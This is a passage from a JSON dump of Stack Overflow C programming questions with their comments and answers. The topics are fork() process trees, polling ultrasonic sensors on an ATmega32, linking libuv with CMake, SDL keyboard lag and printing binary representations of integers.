&lt;sys/wait.h&gt;\n\nint main ()\n{\n    int i;\n    printf(\"\\n [ID = %d] I am the root parent \\n\", getpid());\n    for(i=0;i&lt;4;i++)\n    {\n        pid_t ret=fork();\n        if(ret &lt;0) //eror occured\n        {       \n            printf(\"Fork Failed \\n\");\n            return 1;\n        }\n        else if (ret == 0){\n            printf(\"\\n [ID =%d] My parent is [%d]\\n\", getpid(), getppid());\n        }\n        else\n        {\n            wait(NULL);\n            exit(0);\n        }\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>and this is my output </p>\n\n<pre><code>[ID = 4478] I am the root parent \n\n [ID =4479] My parent is [4478]\n\n [ID =4480] My parent is [4479]\n\n [ID =4481] My parent is [4480]\n\n [ID =4482] My parent is [4481]\n</code></pre>\n\n<p>When I sketch this out, it's just a chain process tree.</p>\n\n<pre><code>p\n|\nC1\n|\nC2\n|\nC3\n|\nC4\n</code></pre>\n\n<p>I tried other methods of writing this but this was as close to getting four children. I've been getting 6 on my other tries. </p>\n"}, {"tags": ["c", "sensors", "avr"], "comments": [{"owner": {"reputation": 5101, "user_id": 700170, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gZ8hw.png?s=128&g=1", "display_name": "Morten Jensen", "link": "https://stackoverflow.com/users/700170/morten-jensen"}, "edited": false, "score": 1, "creation_date": 1518005602, "post_id": 48663450, "comment_id": 84324283, "body": "It&#39;s difficult to help you since you don&#39;t mention much about your real-time requirements, but only mention that FreeRTOS is too inaccurate for your taste/needs. Please write some more about the requirements regarding timeliness."}, {"owner": {"reputation": 353, "user_id": 9090821, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KgpAu.jpg?s=128&g=1", "display_name": "MemAllox", "link": "https://stackoverflow.com/users/9090821/memallox"}, "edited": false, "score": 1, "creation_date": 1518005793, "post_id": 48663450, "comment_id": 84324399, "body": "Which kind of ultrasonic sensors do u use? How do you use them? Isn&#39;t the real question why polling didn&#39;t work?"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1518006460, "post_id": 48663450, "comment_id": 84324822, "body": "Umm.. just how fast is your car parking itself?  You may be better keeping the auto-foot off the gas a bit.."}, {"owner": {"reputation": 11, "user_id": 9327271, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-dtzSarFuDz0/AAAAAAAAAAI/AAAAAAAAAHQ/NHDsFZkXD8E/photo.jpg?sz=128", "display_name": "Nada", "link": "https://stackoverflow.com/users/9327271/nada"}, "reply_to_user": {"reputation": 353, "user_id": 9090821, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KgpAu.jpg?s=128&g=1", "display_name": "MemAllox", "link": "https://stackoverflow.com/users/9090821/memallox"}, "edited": false, "score": 0, "creation_date": 1518008220, "post_id": 48663450, "comment_id": 84325991, "body": "@MemAllox I have just modified my question, sorry for not being clear at the first time."}, {"owner": {"reputation": 11, "user_id": 9327271, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-dtzSarFuDz0/AAAAAAAAAAI/AAAAAAAAAHQ/NHDsFZkXD8E/photo.jpg?sz=128", "display_name": "Nada", "link": "https://stackoverflow.com/users/9327271/nada"}, "reply_to_user": {"reputation": 5101, "user_id": 700170, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gZ8hw.png?s=128&g=1", "display_name": "Morten Jensen", "link": "https://stackoverflow.com/users/700170/morten-jensen"}, "edited": false, "score": 0, "creation_date": 1518008678, "post_id": 48663450, "comment_id": 84326341, "body": "@MortenJensen because I have to check the falling edge and the signal might goes to low after .5 msec, the periodic task which checks the state of the signal only works every 1msec, I can&#39;t make it work for less than 1 msec because this task checks the state of 8 sensors not just one so it needs the 1msec."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1518013963, "post_id": 48663450, "comment_id": 84330142, "body": "I you have 8 sensors, and the interface is just binary then, if all the sensors are connected to one port, you only need one read, and one compare against previous value, to detect any change on all 8 sensors.  You can do such an operation with a fast timer interrupt.  Any change at all, signal a semaphore."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1518014140, "post_id": 48663450, "comment_id": 84330291, "body": "If your controller is ARM-like, you can keep the previous value permanetly in the interrupt bank, in R8, say, and only copy changed values to some circular buffer before signaling the sema."}, {"owner": {"reputation": 11, "user_id": 9327271, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-dtzSarFuDz0/AAAAAAAAAAI/AAAAAAAAAHQ/NHDsFZkXD8E/photo.jpg?sz=128", "display_name": "Nada", "link": "https://stackoverflow.com/users/9327271/nada"}, "reply_to_user": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1518017938, "post_id": 48663450, "comment_id": 84333033, "body": "@MartinJames I also have to calculate for how long each pin has been high to be able to calculate the distance, does that mean besides the fast timer interrupt I have to use another 8 timers? because there is only three timers in atmega32"}], "answers": [{"tags": [], "owner": {"reputation": 476, "user_id": 5542689, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/3debd7e91e7b5137c920dedd308b3447?s=128&d=identicon&r=PG&f=1", "display_name": "K. Koovalsky", "link": "https://stackoverflow.com/users/5542689/k-koovalsky"}, "is_accepted": false, "score": 2, "last_activity_date": 1518026324, "creation_date": 1518026324, "answer_id": 48670442, "question_id": 48663450, "link": "https://stackoverflow.com/questions/48663450/how-can-i-make-multiple-ultrasonic-sensors-work-at-the-same-time-using-atmega32/48670442#48670442", "title": "how can I make multiple ultrasonic sensors work at the same time using atmega32", "body": "<p>Assuming that You use internal clock which is 8MHz I would try to handle this inside timer overflow interrupt and would use whole port to connect the sensors.</p>\n\n<ol>\n<li><p>Use Timer in normal mode or <a href=\"http://maxembedded.com/2011/07/avr-timers-ctc-mode/\" rel=\"nofollow noreferrer\">CTC</a> mode (which I find quite intuitive) to ensure periodical interrupts. Set the appropriate period. Remember that the clock has pretty low frequency so don't exaggerate (I think that 0,25 ms will fit).</p></li>\n<li><p>Connect the sensors to one port, e.g. PORTB. This is a nice situation because ATmega32 has 4 ports with pins numbered from 0-7 and you use 8 sensors so the register for the specific port can cover all of the pins and You can use one read to get states of all of the pins.</p></li>\n<li><p>Implement the logic:</p>\n\n<pre><code>volatile uint8_t sensors_states;\nvolatile uint8_t read_flag = 0;\n\nISR(TIMER0_OVF_vect)\n{\n    sensors_states = PORTB;\n    read_flag = 1;\n}\n\nint main()\n{\n    // Initialize peripherals ...\n\n    // You must assume on your own how much time could the pin be held\n    // in the same state. This is important because the number must not \n    // be bigger than max value for the type of the array\n    uint8_t states_time[8] = {0, 0, 0, 0, 0, 0, 0, 0};\n    uint8_t prev_sensors_states = PORTB;\n    while(1)\n    {\n        // Wait until the flag will be set in the ISR\n        if(read_flag)\n        {\n            for(uint8_t i = 0, mask = 0x80 ; i &lt; 8 ; i ++, mask &gt;&gt;= 1)\n            {\n                states_time[i]++;\n                // Compare the previous state and present state on each pin\n                uint8_t state = mask &amp; sensors_states;\n                if((mask &amp; prev_sensors_states) != state)\n                {\n                    // Here you can use the state of the pin and the duration of that state.\n                    // Remember that when 'state' is &gt; 0 it means that previous state of the\n                    // pin was '0' and if if 'state' is == 0 then the previous pin state\n                    // was '1' (negation).\n                    do_something_with_pin_change(states_time[i], state);\n\n                    states_time[i] = 0;\n                }\n            }\n            // Save the previous states of the pins\n            prev_sensors_states = sensors_states;\n            // Clear the flag to await next data update\n            read_flag = 0;\n        }\n    }\n}\n</code></pre></li>\n</ol>\n\n<p>If You will try to use FreeRTOS You could use <code>ulTaskNotifyTake</code> and <code>vTaskNotifyGiveFromISR</code>, instead of using <code>read_flag</code>, to implement a simple mechanism which will notify a task from the interrupt that the port has been read. The processor will go into idle state for a while and you could then invoke a sleep function to minimize power consumption.</p>\n\n<p>I don't know what You want to do with this data so I've invoked <code>do_something_with_pin_change</code> function to indicate the point where You can use the data.</p>\n\n<p>To sum up for this solution You would only use one interrupt and of course 8 pins.</p>\n"}], "owner": {"reputation": 11, "user_id": 9327271, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-dtzSarFuDz0/AAAAAAAAAAI/AAAAAAAAAHQ/NHDsFZkXD8E/photo.jpg?sz=128", "display_name": "Nada", "link": "https://stackoverflow.com/users/9327271/nada"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1159, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1616005908, "creation_date": 1518005309, "last_edit_date": 1518007945, "question_id": 48663450, "link": "https://stackoverflow.com/questions/48663450/how-can-i-make-multiple-ultrasonic-sensors-work-at-the-same-time-using-atmega32", "title": "how can I make multiple ultrasonic sensors work at the same time using atmega32", "body": "<p>I am working on an auto-parking car robot and I am using 8 (hc-sr04) ultrasonic sensors (2 at each side) but the problem is that I am using atmega32 which has limited resources only 3 external interrupts and 3 timers (and even if using interrupts somehow works I might run into risk to have two interrupts triggered at the same time).</p>\n\n<p>I am using this sensor : <a href=\"http://ram-e-shop.com/oscmax/catalog/product_info.php?products_id=907\" rel=\"nofollow noreferrer\">http://ram-e-shop.com/oscmax/catalog/product_info.php?products_id=907</a></p>\n\n<p>I've tried using digital I/O pins with polling procedure but it didn't work.\nhere is the code for polling procedure:</p>\n\n<pre><code>unsigned int read_sonar(){\nint dist_in_cm = 0;\ninit_sonar();                       // Setup pins and ports\ntrigger_sonar();                    // send a 10us high pulse\n\n\nwhile(!(ECHO_PIN &amp; (1&lt;&lt;ECHO_BIT))){   // while echo pin is still low\n    USART_Message(\"echo pin low\\r\\n\");\n    trig_counter++;\n     uint32_t max_response_time = SONAR_TIMEOUT;\n    if (trig_counter &gt; max_response_time){   // SONAR_TIMEOUT\n        return TRIG_ERROR;\n    }\n}\n\nTCNT1=0;                            // reset timer\nTCCR1B |= (1&lt;&lt;CS10);              // start 16 bit timer with no prescaler\nTIMSK |= (1&lt;&lt;TOIE1);             // enable overflow interrupt on timer1\noverFlowCounter=0;                  // reset overflow counter\nsei();                              // enable global interrupts\n\nwhile((ECHO_PIN &amp; (1&lt;&lt;ECHO_BIT))){    // while echo pin is still high\n    USART_Message(\"echo pin high\\r\\n\");\n    if (((overFlowCounter*TIMER_MAX)+TCNT1) &gt; SONAR_TIMEOUT){\n        USART_Message(\"timeout\");\n        return ECHO_ERROR;          // No echo within sonar range\n\n    }\n};\n\nTCCR1B = 0x00;                      // stop 16 bit timer with no prescaler\ncli();                              // disable global interrupts\nno_of_ticks = ((overFlowCounter*TIMER_MAX)+TCNT1);  // counter count\n\ndist_in_cm = (no_of_ticks/(CONVERT_TO_CM*CYCLES_PER_US));   // distance in cm\nreturn (dist_in_cm );}\n</code></pre>\n\n<p>This method doesn't work if I want to read all sensors at the same time, because it gets stuck in the loop for a while.</p>\n\n<p>I also tried using freeRTOS to build a task that checks the state of pins like every 1msec but this won't be a time accurate.</p>\n\n<p>any help?</p>\n"}, {"tags": ["c", "cmake"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518005221, "post_id": 48663371, "comment_id": 84324036, "body": "You do <b><i>link</i></b> with the <code>uv</code> library in your project? How do you add the <code>uv</code> library in your <code>CMakeLists.txt</code>? Can you please show it?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518005250, "post_id": 48663371, "comment_id": 84324052, "body": "Also, please take some time to read <a href=\"http://stackoverflow.com/help\">the help pages</a>, especially the sections named <a href=\"http://stackoverflow.com/help/on-topic\">&quot;What topics can I ask about here?&quot;</a> and <a href=\"http://stackoverflow.com/help/dont-ask\">&quot;What types of questions should I avoid asking?&quot;</a>. Also please <a href=\"http://stackoverflow.com/tour\">take the tour</a> and <a href=\"http://stackoverflow.com/help/how-to-ask\">read about how to ask good questions</a>. Lastly please learn how to create a <a href=\"http://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable Example</a>."}, {"owner": {"reputation": 51, "user_id": 9327122, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/16ca1b745abf1d052a2349b1c829e836?s=128&d=identicon&r=PG&f=1", "display_name": "k0shinus", "link": "https://stackoverflow.com/users/9327122/k0shinus"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518011073, "post_id": 48663371, "comment_id": 84328123, "body": "@Someprogrammerdude What commands do you mean when saying <i>link</i>?"}], "answers": [{"comments": [{"owner": {"reputation": 51, "user_id": 9327122, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/16ca1b745abf1d052a2349b1c829e836?s=128&d=identicon&r=PG&f=1", "display_name": "k0shinus", "link": "https://stackoverflow.com/users/9327122/k0shinus"}, "edited": false, "score": 0, "creation_date": 1518011754, "post_id": 48665391, "comment_id": 84328620, "body": "Thanks! I use <code>set( CMAKE_EXE_LINKER_FLAGS &quot;${CMAKE_EXE_LINKER_FLAGS} -luv&quot;)</code> instead of <code>target_link_libraries</code> but it doesn&#39;t work for some reason."}], "tags": [], "owner": {"reputation": 205167, "user_id": 4323, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/qqgFU.png?s=128&g=1", "display_name": "John Zwinck", "link": "https://stackoverflow.com/users/4323/john-zwinck"}, "is_accepted": true, "score": 3, "last_activity_date": 1518011043, "creation_date": 1518011043, "answer_id": 48665391, "question_id": 48663371, "link": "https://stackoverflow.com/questions/48663371/compiling-the-project-using-libuv-with-cmake/48665391#48665391", "title": "Compiling the project using libuv with CMake", "body": "<p>Run <code>make VERBOSE=1</code>.  What linker command does it run?  It must be missing <code>-luv</code>.  To fix that, add something like this to your <code>CMakeLists.txt</code>:</p>\n\n<pre><code>target_link_libraries(foo uv)\n</code></pre>\n"}], "owner": {"reputation": 51, "user_id": 9327122, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/16ca1b745abf1d052a2349b1c829e836?s=128&d=identicon&r=PG&f=1", "display_name": "k0shinus", "link": "https://stackoverflow.com/users/9327122/k0shinus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1533, "favorite_count": 0, "accepted_answer_id": 48665391, "answer_count": 1, "score": 2, "last_activity_date": 1518011043, "creation_date": 1518005034, "question_id": 48663371, "link": "https://stackoverflow.com/questions/48663371/compiling-the-project-using-libuv-with-cmake", "title": "Compiling the project using libuv with CMake", "body": "<p>I have got a small async udp server - <a href=\"https://github.com/koshinus/C_programs/tree/master/diploma\" rel=\"nofollow noreferrer\">RiDE</a>.</p>\n\n<p>And i can't build it with CMake. When i trying to i get errors:</p>\n\n<pre><code>undefined reference to 'uv_default_loop'\nundefined reference to 'uv_udp_init'\n...(other libuv functions)\n</code></pre>\n\n<p>But when i build it with command like this:</p>\n\n<pre><code>gcc -std=c11 RiDE_server.h RiDE_server.cpp main.cpp -o main.x -Wall -luv\n</code></pre>\n\n<p>everything is ok. </p>\n\n<p>I think that the problem is in src/CMakeLists.txt file, but i can't understand how to fix it. Path to libuv headers on my machine - /usr/include. Path to libuv shared libs - /usr/lib/x86-64-linux-gnu.</p>\n"}, {"tags": ["c", "sdl"], "comments": [{"owner": {"reputation": 884, "user_id": 9009404, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6be791318ce35f7966345ff4964a2025?s=128&d=identicon&r=PG&f=1", "display_name": "Uprooted", "link": "https://stackoverflow.com/users/9009404/uprooted"}, "edited": false, "score": 1, "creation_date": 1518004460, "post_id": 48663068, "comment_id": 84323552, "body": "Probably related to <a href=\"https://stackoverflow.com/questions/29373203/sdl-2-0-key-repeat-and-delay\">key repeat delay</a>"}, {"owner": {"reputation": 58398, "user_id": 3233393, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c4c576e0ebcdf0efd653269a5b020347?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/3233393/quentin"}, "edited": false, "score": 2, "creation_date": 1518005971, "post_id": 48663068, "comment_id": 84324521, "body": "You need to call <code>SDL_PollEvent</code> in a loop until it returns null, to empty the event queue each frame."}, {"owner": {"user_type": "does_not_exist", "display_name": "user9259108"}, "reply_to_user": {"reputation": 884, "user_id": 9009404, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6be791318ce35f7966345ff4964a2025?s=128&d=identicon&r=PG&f=1", "display_name": "Uprooted", "link": "https://stackoverflow.com/users/9009404/uprooted"}, "edited": false, "score": 0, "creation_date": 1518006331, "post_id": 48663068, "comment_id": 84324738, "body": "@User7231 Thanks using the following code inside the while loop did the trick : SDL_PumpEvents();          const Uint8* keystates = SDL_GetKeyboardState(NULL);          if(keystates[SDL_SCANCODE_Q])             carre.x = (carre.x+5) % LARGEUR;         else if(keystates[SDL_SCANCODE_ESCAPE])             continuer = false;"}, {"owner": {"user_type": "does_not_exist", "display_name": "user9259108"}, "edited": false, "score": 0, "creation_date": 1518006764, "post_id": 48663068, "comment_id": 84325010, "body": "Just realized I should use  const Uint8* keystates = SDL_GetKeyboardState(NULL); outside of the while loop. Anyway It works :)"}], "owner": {"user_type": "does_not_exist", "display_name": "user9259108"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 68, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1518004157, "creation_date": 1518004157, "question_id": 48663068, "link": "https://stackoverflow.com/questions/48663068/sdl-lag-when-pressing-certain-keys-but-not-others", "title": "SDL lag when pressing certain keys but not others", "body": "<p>I have a square on the screen and I want it to move to the right by 5 pixels every 25ms if a particular key is held down. I don't understand why it works fine with some keys (for example up) but doesn't work as expected with other keys (for example a). By not working properly I mean that instead of taking 6 seconds to cross the whole screen, it takes about 10 seconds and the square takes a while to stop moving after I've stopped pressing the key.</p>\n\n<p>Here's the full code :</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;SDL2/SDL.h&gt;\n#include &lt;stdbool.h&gt;\n#define LARGEUR 1200\n#define HAUTEUR 800\n#define DELAI_RAFRAICHISSEMENT 25\n\nint main(int argc, char *argv[])  \n{\n    int tempsActuel = 0, tempsPrecedent = 0;\n\n    if (SDL_Init(SDL_INIT_VIDEO|SDL_INIT_JOYSTICK) != 0 )\n    {\n        fprintf(stdout,\"Echec de l'initialisation de la SDL   (%s)\\n\",SDL_GetError());\n        return -1;\n    }\n\n    SDL_Window* window;\n    window = SDL_CreateWindow(\"1 2 3 Piano\",SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, LARGEUR, HAUTEUR, SDL_WINDOW_SHOWN);\n\n    SDL_Renderer* renderer;\n    renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);\n\n    SDL_Event event;\n    SDL_Rect ecran = {0, 0, LARGEUR, HAUTEUR};\n    SDL_Rect carre = {0, 775, 25, 25};\n    SDL_Rect carreDroite = {0, 775, 0, 25};\n    SDL_Rect carreGauche = {0, 775, 0, 25};\n\n    bool continuer = true;\n\n    while(continuer){\n        tempsActuel = SDL_GetTicks();\n        if (tempsActuel - tempsPrecedent &lt; DELAI_RAFRAICHISSEMENT){\n            SDL_Delay(DELAI_RAFRAICHISSEMENT - (tempsActuel - tempsPrecedent));\n        }\n        tempsPrecedent = SDL_GetTicks();\n\n        SDL_SetRenderDrawColor(renderer, 255,255,255,0);\n        SDL_RenderFillRect(renderer, &amp;ecran);\n\n        SDL_SetRenderDrawColor(renderer, 0,0,0,0);\n\n        if(carre.x &lt;= 1175)\n            SDL_RenderFillRect(renderer, &amp;carre);\n        else{\n            carreDroite.x = carre.x;\n            carreDroite.w = LARGEUR - carre.x;\n            carreGauche.w = 25 - carreDroite.w;\n            SDL_RenderFillRect(renderer, &amp;carreDroite);\n            SDL_RenderFillRect(renderer, &amp;carreGauche);\n        }\n\n        SDL_RenderPresent(renderer);\n\n        SDL_PollEvent(&amp;event);\n\n        switch(event.type){\n            case SDL_KEYDOWN:\n                if(event.key.keysym.sym == SDLK_a)\n                    carre.x = (carre.x+5) % LARGEUR;\n                else if(event.key.keysym.sym == SDLK_ESCAPE)\n                    continuer = false;\n                break;\n\n            case SDL_QUIT:\n                continuer = false;\n        }\n    }\n\n    SDL_DestroyRenderer(renderer);\n    SDL_DestroyWindow(window);\n    SDL_Quit();\n\n    return 0;\n}\n</code></pre>\n\n<p>Like I said, it works fine if I replace SDLK_a with SDLK_UP. There are very few keys with which it works as expected.</p>\n"}, {"tags": ["c", "long-integer"], "comments": [{"owner": {"reputation": 468, "user_id": 525826, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84a11c4c84c0ec562bfffd0cbb15f6d1?s=128&d=identicon&r=PG", "display_name": "Klaimmore", "link": "https://stackoverflow.com/users/525826/klaimmore"}, "edited": false, "score": 1, "creation_date": 1518002767, "post_id": 48662517, "comment_id": 84322500, "body": "You&#39;re trying to contain a long long number in a long long binary representation? Try to use a char array to do that"}, {"owner": {"reputation": 2327, "user_id": 4742570, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0017a2bafead37c0b8dab5d6df77138c?s=128&d=identicon&r=PG&f=1", "display_name": "jsheeran", "link": "https://stackoverflow.com/users/4742570/jsheeran"}, "edited": false, "score": 1, "creation_date": 1518002792, "post_id": 48662517, "comment_id": 84322522, "body": "The binary representation of 2^63 - 1 is 63 digits long. You&#39;re trying to reinterpret this as a decimal number, so of course it&#39;s going to overflow a <code>long long</code>."}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 1, "creation_date": 1518002869, "post_id": 48662517, "comment_id": 84322561, "body": "The binary representation of a long long number is just that number. The internal representation is already binary. So what are you trying to do???"}, {"owner": {"reputation": 52685, "user_id": 980550, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/8emhY.jpg?s=128&g=1", "display_name": "lurker", "link": "https://stackoverflow.com/users/980550/lurker"}, "edited": false, "score": 0, "creation_date": 1518002873, "post_id": 48662517, "comment_id": 84322565, "body": "Your <code>binaryRepresentation</code> is getting too big to fit in a <code>long long</code> when the number gets big enough. <code>101</code> binary is being treated like 101 decimal in that algorithm."}, {"owner": {"reputation": 131, "user_id": 9323603, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/2fee4a1f0ad60f1ffca21dd3fceb1e87?s=128&d=identicon&r=PG&f=1", "display_name": "Blackdeath", "link": "https://stackoverflow.com/users/9323603/blackdeath"}, "edited": false, "score": 0, "creation_date": 1518002885, "post_id": 48662517, "comment_id": 84322578, "body": "So what data type should I use for 63 digits long numbers?"}, {"owner": {"reputation": 52685, "user_id": 980550, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/8emhY.jpg?s=128&g=1", "display_name": "lurker", "link": "https://stackoverflow.com/users/980550/lurker"}, "edited": false, "score": 0, "creation_date": 1518002973, "post_id": 48662517, "comment_id": 84322642, "body": "You could either (a) examine the bits most significant first and print them as you go (don&#39;t accumulate <code>binaryRepresentation</code> or (b) use an array then print the array one element at a time to print the binary representation."}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1518003038, "post_id": 48662517, "comment_id": 84322683, "body": "On (a) above, it&#39;s easier to examine the least significant bits first but you can always use recursion (tail recursion?) to print them out in reverse order."}, {"owner": {"reputation": 6192, "user_id": 2041317, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/58b0m.png?s=128&g=1", "display_name": "cup", "link": "https://stackoverflow.com/users/2041317/cup"}, "edited": false, "score": 0, "creation_date": 1518003059, "post_id": 48662517, "comment_id": 84322699, "body": "Try using a char[64]  -&gt; 63 for the digits, and 1 for the terminator."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "reply_to_user": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1518008847, "post_id": 48662517, "comment_id": 84326483, "body": "@Bathsheba: one way to examine bits in MSB-first order is to use a mask made using <code>m = ~0ull - ~0ull&#47;2</code>, and iterate with <code>m &#47;= 2</code>."}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "reply_to_user": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1518008878, "post_id": 48662517, "comment_id": 84326512, "body": "@TobySpeight: I&#39;d upvote that. Twice if I could."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1518018317, "post_id": 48662517, "comment_id": 84333359, "body": "There&#39;s really no reason to do this using division. Simply mask out the bits using bitwise operators. This is most readable and guaranteed to be fast. Any solution without <code>&amp;</code> and shift is wildly fishy."}], "answers": [{"tags": [], "owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "is_accepted": false, "score": 0, "last_activity_date": 1518003815, "creation_date": 1518003815, "answer_id": 48662975, "question_id": 48662517, "link": "https://stackoverflow.com/questions/48662517/long-long-decimal-binary-representation-using-c/48662975#48662975", "title": "Long Long Decimal Binary Representation using C", "body": "<p>I am not sure what you really want to achieve, but here is some code that prints the binary representation of a number (change the <code>typedef</code> to the integral type you want):</p>\n\n<pre><code>typedef int shift_t;\n#define NBITS   (sizeof(shift_t)*8)\n\nvoid printnum(shift_t num, int nbits)\n{\n    int k= (num&amp;(1LL&lt;&lt;nbits))?1:0;\n    printf(\"%d\",k);\n    if (nbits) printnum(num,nbits-1);\n}\nvoid test(void)\n{\n    shift_t l;\n    l= -1;\n    printnum(l,NBITS-1);\n    printf(\"\\n\");\n    l= (1&lt;&lt;(NBITS-2));\n    printnum(l,NBITS-1);\n    printf(\"\\n\");\n    l= 5;\n    printnum(l,NBITS-1);\n    printf(\"\\n\");\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1518004978, "post_id": 48662991, "comment_id": 84323888, "body": "Small nitpick: this doesn&#39;t work well with a negative input. Change the type to unsigned long long? But this is otherwise better IMHO than my approach which is little more than an abuse of recursion and stack frames."}, {"owner": {"reputation": 52685, "user_id": 980550, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/8emhY.jpg?s=128&g=1", "display_name": "lurker", "link": "https://stackoverflow.com/users/980550/lurker"}, "reply_to_user": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1518008507, "post_id": 